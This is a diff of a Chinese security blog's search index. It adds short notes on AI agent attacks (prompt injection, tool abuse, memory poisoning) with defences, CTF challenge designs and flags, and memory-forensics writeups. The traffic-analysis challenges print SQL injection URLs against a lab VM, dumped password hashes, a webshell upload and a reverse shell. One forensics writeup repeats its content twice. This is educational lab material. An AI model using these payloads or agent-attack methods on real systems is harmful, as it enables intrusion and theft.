@@ -1,14 +1,958 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>测试templates功能</title>
-    <url>/2026/06/30/%E6%B5%8B%E8%AF%95templates%E5%8A%9F%E8%83%BD/</url>
-    <content><![CDATA[]]></content>
+    <title>AI Security</title>
+    <url>/2026/07/17/AI%20Security/</url>
+    <content><![CDATA[常见的攻击
+Prompt Injection
+Agent越权
+Tool调用绕过
+Memory污染
+数据泄露
+Agent行为漂移
+多Agent攻击链
+
+Prompt Injection输入内容欺骗AI的行为，改变它的逻辑
+
+直接注入
+间接注入，比如读一个有害的邮件，读一个网页（网页中有危险的隐藏文字）防：
+
+
+prompt分离 System prompt、用户的输入、外部的数据、工具返回数据都严格的隔离
+权限限制  限制agent的权限
+
+Tool Abuse诱导滥用Agent能使用的工具，shell、数据库、文件系统、API等防：
+
+Agent权限精细分级
+工具权限分级限定
+Agent对工具里的参数进行验证
+
+Memory Poisoning污染Agent的长期记忆，覆盖初始记忆，影响未来的决策防：
+
+对输入进行验证，输入信息来自哪个角色，是否敏感、可信
+对记忆进行隔离，System Memory、User Memory和暂时Memory进行隔离
+
+Agent AuthorizationAgent权限控制防：
+
+最小权限  对Agent的基础权限进行控制，比如哪些角色对应的Agent该对应什么权限；对时间、地点、风险和任务对Agent进行限制；  权限分层，设置不同的Level等级越高、权限越高、限制越严格
+
+]]></content>
       <categories>
-        <category>test</category>
+        <category>AI</category>
       </categories>
       <tags>
-        <tag>tets</tag>
+        <tag>AI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Day</title>
+    <url>/2026/07/21/Day/</url>
+    <content><![CDATA[
+  
+    4052177b7859f44dd5294d0dd5aa239551575af926a23efe4fe4b06d7c126aa00cd3f26204b3603818b81f035369ed3a7e4cf02540b0760ecfdbd84ee50993896301b503f0fcbaa6ea58eaf4761b902c356b80c8b4a840f775a4b7460e41b6a11d7edb7dbe1505d1ef9ac391ce58bd66eb77e7401b6a9fe78ee6fc8e740b30263f0cea084030f9cdd51a8b4c6d94d258c641d467e89647f919f165c45142d341778e430cfbdec8f99532898d199fcafbf856450179d35afb37099d9094a7a041b48edc9f33dcfc9ef564c82ccd0037a6e107135e6adc33904f6765889e7693ff750a6a7490c77cb7b6eef9f93f5239d549caf6d9cdb27f4eeabd15089f38da4edc3588cb16e26e4611c94150fc9936cd375501d7a5691e3d61899a11688635ad599c12018a89b165f4c0923d1e9df1540390d66a98daffc91860684ee1a18eb5639dc512a54500a46ef2bec72b0ed99838be0051b2692eaf7987021557577136a3dee96548b6d7bcfab5ea8d8d5f418eb989e54b38006723abb5ad6a943617fdf912c5e1442c95a89ca679e2307d2cebc5b2515592cf8572e1534906b818eaafb50e6405bdbc54982b3c1a5ca2e041c8a1f47d229482618019565de1c6c09fe140055d042fd9107791df7a216c03da54193e23128d2a9eeb5ed5b4698aa95eabd9e40cec06a7f227232440c488b182fbab840e6a131c4b94b76d07c03c2e5a4f7015970dd718a2efae4b13c3f408a16373aa78313976896e667c3f3aef6fdbabc0d9ba24a674f43620a7e683279ad0f4704f6a80ef93654e5f16bc88317e885d9f50fbc32770fa1970b4a36233b17788fd2bd069d927d421b21f5f51a1a6831e6d9531e0e8907fb4709831a69fd089e711162e37e87c9018044aa9b6c20b2f35c39e982f5515a2c4ae5eefa038f7a5db564c015b2ffbc7493336a625940aa5fffef0170b70ac90b3d324247f32abd12c474df2e02bc87277ed6d77af57db6f7b93021a1ae64a0885aa6fe9e57af39c7fab5c2fa0cf485208e670902219a33bb593af9d3c35707ea9b289d42d684c9feda94aa3fa8edaf78e0e800b65545b5f48acf7fd5692a8fff49e660f2a94b4e6a7b59f3ff6f7052ed3d119247fe1a039facc954c69f0b9160756dc17443a815e8e5c6ba452741a22a6206e54c14f950cf899b90e8e116e20d8c78ceb16554351cde015947a39db14fe07aee1b8ce56a23a23b6c71c560f1eaf68a0bd01409e4ce090a839069dd09422c6843e4ddd38e8a611d4c194ea5977adedc211a59ee5ac387fb2abcff2b9c173c86bb36d3d8568d8036e0c95c671bafa8c24839d93aca2bbb44283008e80cfa31ac9e37c7a9d4124a03f54fbff97d42af3bba1862b4310a1ec41c741d41663eb966349dfe76e45ea56098756809670d39a4ca4b0372642ad0f13aa633d52109068fa9ebe12ebf0520430b4558b764df7d42735f92e4ea823a5fc67769365853d6c51a654eda9489ef53748afd7ffd8338a9ea87bab884b9f5c4f3e1a95b911f19542da5d0ea4b1491bb3e847a251b1ac91a7de363c5e26eb120cae6268091969cb7ff0f03cab8544c20e46d6d7a026e0b132fa486233d6a92c891a2805558f5bbc24744b43df516a94baf4e639abb3d33593645c4dbcea8881624901226900460108db1e15f467f4974e6c6913b0f55c0d2964825e9e3309e31e910d6e004bb094d049ac9dd17204436c52c3e8779d8bf50b8806eee01d023f4de182de17e8c73226e5d1477c0c1e4c6d277809c8395b690f379cab619de3ec6e4357575faacd108fb240
+  
+  
+    
+      
+      
+      
+        Hey, password is required here.
+      
+    
+      Decrypt
+      
+    
+  
+
+]]></content>
+      <categories>
+        <category>myself</category>
+      </categories>
+      <tags>
+        <tag>Day</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2025CTF新生赛misc出题笔记</title>
+    <url>/2026/07/01/2025CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmisc%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[2025CTF新生赛misc出题笔记赛题设计说明[题目信息]：
+
+
+出题人
+出题时间
+题目名字
+题目类型
+难度等级
+题目分值
+
+
+
+retu
+20251107
+out&amp;in
+misc
+1
+100
+
+
+[题目场景]:word文档隐写
+[题目描述]：dong吃饭去了，ming鬼鬼祟祟地走到他的电脑前，并把他找到的 flag文件重新藏了起来。等到dong回来的时候，ming仰天长笑（捋胡子）道：“我给你留了首诗，就在文档里~”dong赶走了他，回到电脑前，说：“啧啧啧，ming这隐藏技术，新生都找得到，just so so！”
+[题目考点]：word文档隐写+丢丢脑洞
+[是否原创]：是
+[Flag]:flag{H0ppy_To_g3T_fLa9!}
+[题目环境]：[特别注意]：无
+[题目制作过程]：将文档一些数据颜色调为白色初步隐藏，然后无聊时盯着键盘就想到了连连看，就在键盘上连出了密码，然后利用.docx作为ZIP压缩包的特性，将flag文件打包进了.docx文档中
+[题目writeup]：Ctrl+A全选，发现有隐藏部分（这里根据诗的提示也可以找到猫腻），将字体颜色全调成红色，可以看到三组字符串，根据提示密码为三位数，而且是低头看手下，那么可以看到键盘，分析这三住字符串的组成也能看出，因为它数据的种类横跨了字母、数字和符号，显然就是键盘，那么得到密码AFL，了解.docx的特性的朋友就想到了——改后缀为.zip查看是否有文件隐藏其中，找到flag.zip文件用得到的密码解码就可以得到flag；（这里也可以在010editor中搜索flag字符串，在文件尾前面一点可以发现flag.zip文件，然后就可以知道隐藏了文件了）
+注意事项
+无
+
+[题目信息]：
+
+
+出题人
+出题时间
+题目名字
+题目类型
+难度等级
+题目分值
+
+
+
+retu
+20251107
+easy_wp-1
+misc
+2
+100
+
+
+[题目场景]:流量分析
+[题目描述]：[题目情景纯属虚构，仅供娱乐]
+在一个满课的夜晚，ming打下了一个靶机，站起身来仰天：“啊哈哈哈哈哈！不要小看我与它的羁绊啊！谁有我快”。在他对面的dong露出坏笑接下了挑战，ming打靶机一贯喜欢开着wireshark进行抓包事后分析，dong说：你把wireshark给我瞧瞧，我不必吹灰之力就能拿下。在dong看完.pcap后笑道：“桀桀桀，你真的拿下了吗……”。
+[注]：流量分析系列题，后面的题都基于本题附件。
+本题flag为ming得到的用于登录的用户名和密码，flag格式为flag{username_password}
+[题目考点]：流量分析
+[是否原创]：是
+[Flag]:flag{GeorgeMiller_q1w2e3}
+[题目环境]：[特别注意]：无
+[题目制作过程]：前几天刷靶机刷到了这个，尝试了下for手动扫描ip和端口的操作，考虑到这个操作产生的数据包较少而且是SQL注入的话分析起来较简单，就抓包就作为题目了
+[题目writeup]：过滤http，注意到287,329,349,415的数据包正在进行SQL注入的操作
+287包在进行SQL注入尝试
+&lt;http://192.168.247.135/Hackademic_RTB1/?cat=1&gt;&#x27;
+
+发现有报错信息返回，返回了数据库的查询语句，后面的几个包是基于这个查询语句在编写注入语句
+#返回的查询语句SELECT * FROM wp_categories WHERE cat_ID = 1 \\\&#x27; LIMIT 1” Category
+
+这里LIMIT 1限制了只返回一行
+329包的URL：
+&lt;http://192.168.247.135/Hackademic_RTB1/?cat=1&gt; union select 1,2,3,4,5
+
+由于查询语句中的LIMIT 1只返回一行那么要想union select 1,2,3,4,5这个联合查询的语句起效，就只能让cat_ID无效
+那么就是349包的URL的sql注入,令cat_ID为0使之失效
+&lt;http://192.168.247.135/Hackademic_RTB1/?cat=0&gt; union select 1,2,3,4,5
+
+而且也可以看到349的返回包返回的错误信息中
+\t\t&lt;h3 class=&quot;page&quot;&gt;Archive for the &amp;#8220;2&amp;#8221; Category&lt;/h3&gt;\r\n，这里显示的是联合查询中第二列的数字2，那么这个第二列可操作就是的点了415包是完整的对WordPress数据库的wp-user表的用户ID，用户名，密码和权限等级的查询
+&lt;http://192.168.247.135/Hackademic_RTB1/?cat=0%20union%20select%201,group_concat(id,0x2d,user_login,0x2d,user_pass,0x2d,user_level),3,4,5%20from%20wp_users&gt;
+
+返回的信息
+1-NickJames-21232f297a57a5a743894a0e4a801fc3-1,2-JohnSmith-b986448f0bb9e5e124ca91d3d650f52c-0,3-GeorgeMiller-7cbb3252ba6b7e9c422fac5334d22054-10,4-TonyBlack-a6e514f9486b83cb53d8d932f9a04292-0,5-JasonKonnors-8601f6e1028a8e8a966f6c33fcd9aec4-0,6-MaxBucky-50484c19f1afdaf3841a0d821ed393d2-0
+
+这里肯定是谁的权限大就用谁的密码进行登录，ID为3的用户的权限等级为10，那么显然就是3-GeorgeMiller-7cbb3252ba6b7e9c422fac5334d22054-10，密码一看MD5，在线网站进行查询得到q1w2e3
+得到flag{GeorgeMiller_q1w2e3}
+注意事项无
+[题目信息]：
+
+
+出题人
+出题时间
+题目名字
+题目类型
+难度等级
+题目分值
+
+
+
+retu
+20251107
+easy_wp-2
+misc
+1
+200
+
+
+[题目场景]:流量分析
+[题目描述]：[题目情景纯属虚构，仅供娱乐]
+在一个满课的夜晚，ming打下了一个靶机，站起身来仰天：“啊哈哈哈哈哈！不要小看我与它的羁绊啊！谁有我快”。在他对面的dong露出坏笑接下了挑战，ming打靶机一贯喜欢开着wireshark进行抓包事后分析，dong说：你把wireshark给我瞧瞧，我不必吹灰之力就能拿下。在dong看完.pcap后笑道：“桀桀桀，你真的拿下了吗……”。
+[注]：流量分析系列题，后面的题都基于本题附件。
+本题flag为ming从本机上传的文件名，flag格式为flag{XXX.XXX}
+[题目考点]：流量分析
+[是否原创]：是
+[Flag]:flag{shell.php}
+[题目环境]：[特别注意]：无
+[题目制作过程]：前几天刷靶机刷到了这个，尝试了下for手动扫描ip和端口的操作，考虑到这个操作产生的数据包较少而且是SQL注入的话分析起来较简单，就抓包就作为题目了
+[题目writeup]：这个题有个挖坑点，就是我上传的文件名是shell.php，但是因为之前上传了shell.php，所以这个里名字重复了，文件上传那里它就直接把shell.php给重命名为shell_10.php了，这里如果想省事，在wireshark过滤http直接看的话可能会定位到shell_10.php，就不对了。（虽然说这算是个挖坑点，但是感觉也没什么人掉坑里面）
+可以看到641包，也就是在wp-upload上传了文件的返回包，里面有信息显示The filename ‘shell.php’ already exists!
+那这就说明ming上传给的文件是shell.php
+注意事项
+无
+
+[题目信息]：
+
+
+出题人
+出题时间
+题目名字
+题目类型
+难度等级
+题目分值
+
+
+
+retu
+20251107
+easy_wp-3
+misc
+2
+200
+
+
+[题目场景]:流量分析
+[题目描述]：[题目情景纯属虚构，仅供娱乐]
+在一个满课的夜晚，ming打下了一个靶机，站起身来仰天：“啊哈哈哈哈哈！不要小看我与它的羁绊啊！谁有我快”。在他对面的dong露出坏笑接下了挑战，ming打靶机一贯喜欢开着wireshark进行抓包事后分析，dong说：你把wireshark给我瞧瞧，我不必吹灰之力就能拿下。在dong看完.pcap后笑道：“桀桀桀，你真的拿下了吗……”。
+[注]：流量分析系列题，后面的题都基于本题附件。
+本题flag为ming通过哪个端口对靶机进行监听控制，flag格式为flag{port}
+[题目考点]：流量分析
+[是否原创]：是
+[Flag]:flag{1234}
+[题目环境]：[特别注意]：无
+[题目制作过程]：前几天刷靶机刷到了这个，尝试了下for手动扫描ip和端口的操作，考虑到这个操作产生的数据包较少而且是SQL注入的话分析起来较简单，就抓包就作为题目了
+[题目writeup]：这里攻击者上传了反弹shell下一步肯定就要准备监听控制了，可以找到最后一次访问http://192.168.247.135/714/Hackademic_RTB1/wp-content/shell_10.php 的包，直接搜索含shell_10.php的包，在这后面的数据包基本上就会有监听的操作，可以找到714就是访问shell.php的最后一个包在这个包的后面可以看到716包，目标机192.168.247.135主动向攻击机192.168.247.128发起了TCP握手请求，并进行了不规则长度数据传输。再加上（知名端口范围: 0-1023 ）1234端口: 不在任何知名服务中注册。那么这里1234端口就是在被监听控制
+注意事项
+无
+
+[题目信息]：
+
+
+出题人
+出题时间
+题目名字
+题目类型
+难度等级
+题目分值
+
+
+
+retu
+20251107
+easy_wp-4
+misc
+1
+200
+
+
+[题目场景]:流量分析
+[题目描述]：[题目情景纯属虚构，仅供娱乐]
+在一个满课的夜晚，ming打下了一个靶机，站起身来仰天：“啊哈哈哈哈哈！不要小看我与它的羁绊啊！谁有我快”。在他对面的dong露出坏笑接下了挑战，ming打靶机一贯喜欢开着wireshark进行抓包事后分析，dong说：你把wireshark给我瞧瞧，我不必吹灰之力就能拿下。在dong看完.pcap后笑道：“桀桀桀，你真的拿下了吗……”。
+[注]：流量分析系列题，后面的题都基于本题附件。
+本题flag为ming得到的是什么用户的shell，flag格式为flag{XXX}
+[题目考点]：流量分析
+[是否原创]：是
+[Flag]:flag{apache}
+[题目环境]：[特别注意]：无
+[题目制作过程]：前几天刷靶机刷到了这个，尝试了下for手动扫描ip和端口的操作，考虑到这个操作产生的数据包较少而且是SQL注入的话分析起来较简单，就抓包就作为题目了
+[题目writeup]：这里肯定是在与端口1234交互的情况下，攻击者通过nc监听1234端口，拿到了普通的权限的用户后，一般会进行简单的信息收集比如ip -a——查看IP地址是否与目标机符合，uname -a——显示系统详细信息，whoami——当前用户,sudo -l——当前用户的权限。
+知道whoami命令的直接查找，723包的data显示whoami不知道的whoami的命令的话，反正数据包也不多，直接在两个IP通过1234端口交互的包的data字段找就行
+在这个包往后找肯定就能得到shell的用户身份了
+729包中data数据显示是apache
+注意事项
+无
+
+[题目信息]：
+
+
+出题人
+出题时间
+题目名字
+题目类型
+难度等级
+题目分值
+
+
+
+leed
+20251105
+何意味？
+misc
+1
+100
+
+
+[题目场景]:[题目描述]：嗷呜啊~
+[题目考点]：编码转换+base4变种+偏移
+就是兽音译者，直接用网上的工具秒解
+[是否原创]：是
+[Flag]:flag{c4e6b3b0-1d5a-4b9f-8c3e-9a0b2f1d7c6a}
+[题目环境]：[特别注意]：无
+[题目制作过程]：放一下网上找的源码，编码字符已替换
+ class HowlingAnimalsTranslator:     __animalVoice=&quot;何意味？&quot;      def __init__(self,newAnimalVoice=None):         self.setAnimalVoice(newAnimalVoice)      def convert(self,txt=&quot;&quot;):         txt=txt.strip()         if(txt.__len__()&lt;1):             return &quot;&quot;         result=self.__animalVoice[3]+self.__animalVoice[1]+self.__animalVoice[0]         offset=0         for t in txt:             c=ord(t)             b=12             while(b&gt;=0):                 hex=(c&gt;&gt;b)+offset&amp;15                 offset+=1                 result+=self.__animalVoice[int(hex&gt;&gt;2)]                 result+=self.__animalVoice[int(hex&amp;3)]                 b-=4         result+=self.__animalVoice[2]         return result      def deConvert(self,txt):         txt=txt.strip()         if(not self.identify(txt)):             return &quot;Incorrect format!&quot;         result=&quot;&quot;         i=3         offset=0         while(i&lt;txt.__len__()-1):             c=0             b=i+8             while(i&lt;b):                 n1=self.__animalVoice.index(txt[i])                 i+=1                 n2=self.__animalVoice.index(txt[i])                 c=c&lt;&lt;4|((n1&lt;&lt;2|n2)+offset)&amp;15                 if(offset==0):                     offset=0x10000*0x10000-1                 else:                     offset-=1                 i+=1             result+=chr(c)         return result      def identify(self,txt):         if(txt):             txt=txt.strip()             if(txt.__len__()&gt;11):                 if(txt[0]==self.__animalVoice[3] and txt[1]==self.__animalVoice[1] and txt[2]==self.__animalVoice[0] and txt[-1]==self.__animalVoice[2] and ((txt.__len__()-4)%8)==0):                     for t in txt:                         if(not self.__animalVoice.__contains__(t)):                             return False                     return True         return False      def setAnimalVoice(self,voiceTxt):         if(voiceTxt):             voiceTxt=voiceTxt.strip()             if(voiceTxt.__len__()==4):                 self.__animalVoice=voiceTxt                 return True         return False      def getAnimalVoice(self):         return self.__animalVoice
+
+[题目writeup]：
+注意事项
+无
+
+[题目信息]：
+
+
+出题人
+出题时间
+题目名字
+题目类型
+难度等级
+题目分值
+
+
+
+leed
+20251017
+not_deep
+misc
+1
+100
+
+
+[题目场景]:[题目描述]：“无言的震颤跨越了光明与黑暗，但真正的秘密，藏在比黑洞更深邃的（deep）声音里。”谜语人路过留下这句话就走了。
+[题目考点]：频谱图+deepsound
+知道deepsound和会看频谱图秒解；其实不看频谱图也行，电波对上的话听歌识曲，歌曲名的罗马音就是deepsound的密码。
+[是否原创]：是
+[Flag]:flag{Wow_You_find_the_flag}
+[题目环境]：[特别注意]：无
+[题目制作过程]：用coagulalight和Audacity在频谱图上加了密码，再用deepsound把flag文件藏在wav中
+[题目writeup]：
+c2F5b25hcmF0ZW5nb2t1bWF0YWtpdGVqaWdva3U&#x3D;base64解码：
+sayonaratengokumatakitejigoku
+
+输入密钥即可提取
+
+注意事项
+无
+
+[题目信息]：
+
+
+出题人
+出题时间
+题目名字
+题目类型
+难度等级
+题目分值
+
+
+
+leed
+20251107
+藏到骨子里
+misc
+1
+150
+
+
+[题目场景]:[题目描述]：期末周的你belike：
+[题目考点]：binwalk分离文件+zip弱口令爆破+hex编码隐写+二维码补全定位角
+不binwalk直接从010里面把压缩包找出来也行，二维码有偷偷转个方向
+[是否原创]：是
+[Flag]:flag{bro_is_watching_you}
+[题目环境]：[特别注意]：无
+[题目制作过程]：第一部分的flag文本转换二维码，把定位角擦掉然后放在gif图里；第二部分flag直接用010藏在编码里，然后压缩。把压缩包和图片合并。
+[题目writeup]：丢进010
+
+发现pk头，是zip文件，分离出来，binwalk或者直接把编码提取出来，这里binwalk –e
+
+
+有密码，用zip解密工具爆破一下，发现密码是4位数字6499
+解密出来是一个gif图
+第四张短暂闪过一个二维码的部分，发现不能直接扫描
+
+缺的定位角，在网上找个二维码截取一下
+用工具补上
+
+扫描成功得到第一段
+
+再找一下下一段
+
+在最后面看到了
+flag{bro_is_watching_you}
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>solar1应急响应-2025.10月</title>
+    <url>/2026/07/01/solar1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-2025.10%E6%9C%88/</url>
+    <content><![CDATA[工厂应急响应Q3
+
+1.1.1.1 (公共 DNS)
+192.0.2.34 (测试网络)
+8.8.8.8 (Google DNS)
+198.51.100.5 (测试网络)
+10.0.0.8 (内网地址)
+203.0.113.20 (测试网络)
+10.0.0.8 是唯一的内网地址，其他都是公网或测试地址
+flag{10.0.0.8}
+  
+💡
+
+A 记录
+DNS 系统中最核心的记录类型之一,将域名指向一个 IPv4 地址
+域名：engws.plant.local  →  A记录解析 →  IP地址：10.0.0.8
+
+其他常见 DNS 记录类型
+
+
+
+记录类型
+作用
+
+
+
+A 记录
+域名 → IPv4 地址
+
+
+AAAA 记录
+域名 → IPv6 地址
+
+
+CNAME 记录
+域名 → 另一个域名（别名）
+
+
+MX 记录
+邮件服务器地址
+
+
+
+
+
+
+
+
+
+
+工厂应急Q5
+
+
+flag{engws.plant.local_&#x2F;rpc}
+而且由这题可以确定HMI的IP是10.0.0.5，工程站IP是10.0.0.8
+了解了一下HMI：
+  
+💡
+
+HMI 就是操作人员与机器、设备或系统进行交互和控制的界面。它是人与机器之间信息交换的桥梁。
+
+
+工厂应急Q4
+
+icmp请求中找不到一个request请求成功的包，那么就想既然是成功发起，还有一个协议也能就是TCP，在第三次握手时表示的应该是成功连接
+
+
+了解提交格式
+YYYY-MM-DDTHH:MM:SSZ
+
+YYYY &#x3D; 4位年份
+MM &#x3D; 2位月份（01-12）
+DD &#x3D; 2位日期（01-31）
+T &#x3D; 时间开始分隔符
+HH &#x3D; 2位小时（00-23）
+MM &#x3D; 2位分钟（00-59）
+SS &#x3D; 2位秒（00-59）
+Z &#x3D; 表示 UTC 时区
+
+工厂应急Q2
+没听过这个NodeId
+  
+💡
+
+NodeId 通常指的是网络设备、主机或服务的唯一标识符，用于在特定的网络协议或管理系统中进行寻址、管理和通信。
+它的意义在于：
+
+流量来源&#x2F;目的地识别：明确这个数据包是来自哪个节点，或者要发送给哪个节点。
+故障诊断：如果某个 NodeId 的节点停止发送心跳或产生异常流量，可以快速定位故障设备。
+拓扑发现：通过分析流量包中的 NodeId，可以自动绘制出网络或服务之间的通信拓扑图。
+安全分析：发现一个未经授权的 NodeId 在发送流量，可能意味着存在非法接入或网络攻击。   
+
+frame contains &quot;NodeId&quot;tcp contains &quot;NodeId&quot; http contains &quot;NodeId&quot;
+
+
+
+
+发现不行
+opcua || tcp contains &quot;Write&quot; ||http contains &quot;write&quot;
+
+
+flag{ns&#x3D;2;s&#x3D;Pump&#x2F;SpeedSetpoint}
+工厂应急响应Q1
+在Q2那里找到的NodeId正好出现了Pump也就是泵的字样
+这里将泵的速度改了，可能会引起它的故障
+然后后面题目又加了提示
+
+这是典型的 Modbus TCP 协议格式：
+
+transaction_id：事务标识符
+function_code：功能码
+coil_address：线圈地址
+
+在真实的工厂环境中：
+
+OPC UA：常用于上层监控系统（HMI、SCADA）之间的数据交换，更偏向于”数据展示和聚合”。
+Modbus：常用于底层设备控制（PLC、变频器、泵控制器），直接对设备寄存器&#x2F;线圈进行读写。
+
+
+1.1.1.1 (公共 DNS)
+192.0.2.34 (测试网络)
+8.8.8.8 (Google DNS)
+198.51.100.5 (测试网络)
+10.0.0.8 (内网地址)
+203.0.113.20 (测试网络)
+10.0.0.8 是唯一的内网地址，其他都是公网或测试地址
+flag{10.0.0.8}
+  
+💡
+
+A 记录
+DNS 系统中最核心的记录类型之一,将域名指向一个 IPv4 地址
+域名：engws.plant.local  →  A记录解析 →  IP地址：10.0.0.8
+
+其他常见 DNS 记录类型
+
+
+
+记录类型
+作用
+
+
+
+A 记录
+域名 → IPv4 地址
+
+
+AAAA 记录
+域名 → IPv6 地址
+
+
+CNAME 记录
+域名 → 另一个域名（别名）
+
+
+MX 记录
+邮件服务器地址
+
+
+
+
+
+
+
+工厂应急Q5
+
+
+
+flag{engws.plant.local_&#x2F;rpc}
+而且由这题可以确定HMI的IP是10.0.0.5，工程站IP是10.0.0.8
+了解了一下HMI：
+  
+💡
+
+HMI 就是操作人员与机器、设备或系统进行交互和控制的界面。它是人与机器之间信息交换的桥梁。
+
+
+工厂应急Q4
+
+icmp请求中找不到一个request请求成功的包，那么就想既然是成功发起，还有一个协议也能就是TCP，在第三次握手时表示的应该是成功连接
+
+
+了解提交格式
+YYYY-MM-DDTHH:MM:SSZ
+
+YYYY &#x3D; 4位年份
+MM &#x3D; 2位月份（01-12）
+DD &#x3D; 2位日期（01-31）
+T &#x3D; 时间开始分隔符
+HH &#x3D; 2位小时（00-23）
+MM &#x3D; 2位分钟（00-59）
+SS &#x3D; 2位秒（00-59）
+Z &#x3D; 表示 UTC 时区
+
+工厂应急Q2
+没听过这个NodeId
+  
+💡
+
+NodeId 通常指的是网络设备、主机或服务的唯一标识符，用于在特定的网络协议或管理系统中进行寻址、管理和通信。
+它的意义在于：
+
+流量来源&#x2F;目的地识别：明确这个数据包是来自哪个节点，或者要发送给哪个节点。
+故障诊断：如果某个 NodeId 的节点停止发送心跳或产生异常流量，可以快速定位故障设备。
+拓扑发现：通过分析流量包中的 NodeId，可以自动绘制出网络或服务之间的通信拓扑图。
+安全分析：发现一个未经授权的 NodeId 在发送流量，可能意味着存在非法接入或网络攻击。   
+
+frame contains &quot;NodeId&quot;tcp contains &quot;NodeId&quot; http contains &quot;NodeId&quot;
+
+
+
+
+发现不行
+opcua || tcp contains &quot;Write&quot; ||http contains &quot;write&quot;
+
+
+
+flag{ns&#x3D;2;s&#x3D;Pump&#x2F;SpeedSetpoint}
+工厂应急响应Q1
+在Q2那里找到的NodeId正好出现了Pump也就是泵的字样
+这里将泵的速度改了，可能会引起它的故障
+然后后面题目又加了提示
+
+这是典型的 Modbus TCP 协议格式：
+
+transaction_id：事务标识符
+function_code：功能码
+coil_address：线圈地址
+
+在真实的工厂环境中：
+
+OPC UA：常用于上层监控系统（HMI、SCADA）之间的数据交换，更偏向于”数据展示和聚合”。
+Modbus：常用于底层设备控制（PLC、变频器、泵控制器），直接对设备寄存器&#x2F;线圈进行读写。
+
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>solar</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>solar应急响应-2025.7月</title>
+    <url>/2026/07/01/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-2025.7%E6%9C%88/</url>
+    <content><![CDATA[【任务1】VOL_EASY某企业服务器近日遭受隐秘入侵。安全团队通过日志溯源发现，黑客利用Web应用漏洞植入恶意后门，根据溯源的信息配合警方逮捕了黑客，安全团队已经紧急保存了黑客电脑的内存转储文件，请你开始取证以便固定证据。
+黑客上传的**一句话木马**密码是多少？
+核心特征是：
+
+存在特定函数（如eval、assert）与接收参数（即密码，如pass）
+通常会在 Web 服务进程（如httpd.exe、nginx.exe、w3wp.exe）的内存中留下痕迹
+可能关联到 Web 目录下的恶意文件（如shell.php）
+
+首先看到附件给的.vmem文件以及题目名vol，想到用Volatility工具进行内存取证分析
+vol -f vol_easy.vmem windows.pslist        #查看进程
+
+在文件中搜索是否有.php文件类似的webshell
+vol -f vol_easy.vmem windows.filescan | grep -i &quot;\\.php&quot;
+
+
+发现有个ezshell.php.txt，很可能就是一句话木马所在的文件，那么接下来就是提取文件，发现文件保存在了file.0x7ddf2280.0xfa801af79b30.DataSectionObject.ezshell.php.txt.dat，这个.dat文件夹中
+vol -f vol_easy.vmem windows.dumpfiles --physaddr 0x7ddf2280  #使用 dumpfiles 插件提取文件
+
+
+那么查看文件夹并查看文件
+
+得到了一句话木马的密码 solar
+【任务2】VOL_EASY黑客使用的木马连接工具叫什么（比如xx.exe）
+一句话木马通常运行在 Web 服务进程中，那么就要查看系统当前正在运行的进程相关信息
+
+可以发现两个比较敏感的进程 antsword 和iexplore 蚁剑和IE浏览器，显然连接工具就是蚁剑，Antsword.exe
+【任务3】VOL_EASY黑客使用的木马连接工具的位置在哪里（比如C:\xxxx\xx.exe)
+vol -f vol_easy.vmem windows.pslist | grep &quot;AntSword.exe&quot;   #查看AntSword.exe
+
+
+vol -f vol_easy.vmem windows.cmdline --pid 1716          #使用 cmdline 插件查看命令行参数
+
+
+得到了AntSword.exe的文件位置 C:\\Tools\\AntSword-Loader-v4.0.3-win32-x64\\AntSword.exe
+【任务4】VOL_EASY黑客获取到的FLAG是什么？
+直接在文件中搜索flag，看下会不会有
+vol -f vol_easy.vmem windows.filescan | grep -i &quot;flag&quot;
+
+发现有flag.txt的文件，那么查看
+
+vol -f vol_easy.vmem windows.dumpfiles --physaddr 0x7da684a0#提取文件 ls -a *.dat    #查看文件夹 cat file.0x7da684a0.0xfa801b23e7f0.DataSectionObject.flag.txt.dat      #查看信息
+
+
+得到 flag{ok!get_webshell_is_good_idea~}
+【任务5】VOL_EASY黑客入侵的网站地址是多少（只需要http://xxxxx/）
+这个题当时看的时候是没有思路的，然后搜了一些vol3的命令尝试，但总说语法错误，事后看大佬的wp，发现大多用的是vol2.6，那么我尝试用2.6发现可行
+使用YARA扫描技术搜索所有包含 ‘shell.php’ 字符串的内存位置
+./vol2 -f ../vol_easy.vmem --profile=Win7SP1x64 yarascan -Y &quot;shell.php&quot;
+
+发现在iexplore.exe进程下有个网址
+
+http://192.168.186.140/
+【任务6】VOL_EASY黑客入侵时，使用的系统用户名是什么
+这题当时也有点迷，Windows用户账户信息存储在注册表的SAM hive中，那么就要找到SAM的虚拟地址，来提取用户列表
+./volatility_2.6_lin64_standalone/vol2 -f vol_easy.vmem --profile=Win7SP1x64 hivelist    #找SAM虚拟地址
+
+
+./volatility_2.6_lin64_standalone/vol2 -f vol_easy.vmem --profile=Win7SP1x64 printkey -o 0xfffff8a0000a8010 -K &quot;SAM\\Domains\\Account\\Users\\Names&quot;         #提取注册表
+
+
+o 0xfffff8a0000a8010o：指定注册表 hive 的虚拟地址
+
+0xfffff8a0000a8010：SAM 注册表 hive 的内存地址
+
+K &quot;SAM\\Domains\\Account\\Users\\Names&quot;K：指定要读取的注册表路径
+
+&quot;SAM\\Domains\\Account\\Users\\Names&quot;：SAM数据库中存储用户账户名的注册表路径
+发现注册表中有两个用户
+
+看了其他大佬的wp ，还可以直接使用hashdump或者mimikatz
+./volatility_2.6_lin64_standalone/vol2 -f vol_easy.vmem --profile=Win7SP1x64 hashdump
+
+
+然后只有两个用户，进行尝试发现是 Administrator，可能是因为权限大小的原因
+【任务7】VOL_EASY黑客创建隐藏账户的密码是多少？
+隐藏用户是solar$，攻击的信息可能在蚁剑内存中
+蚁剑的工作方式
+
+AntSword 是一个webshell管理客户端
+它会保存所有连接的webshell信息
+内存中会残留连接历史、命令记录、文件操作等
+
+可能包含的关键信息
+
